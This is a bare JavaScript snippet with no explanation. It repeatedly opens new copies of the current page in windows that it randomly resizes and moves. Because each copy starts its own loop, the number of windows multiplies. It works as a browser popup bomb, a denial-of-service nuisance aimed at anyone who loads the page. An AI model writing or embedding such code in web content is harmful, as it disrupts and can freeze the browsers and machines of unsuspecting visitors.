try{
var win;
setTimeout(function(){
setInterval(function(){
win = window.open(location.href, "", "");
win.resizeTo(Math.random() * screen.width, Math.random() * screen.height);
win.moveTo(Math.random() * screen.width, Math.random() * screen.height);
}, 1000);
}, 1000);
} catch(e){
  alert(e.message);
}
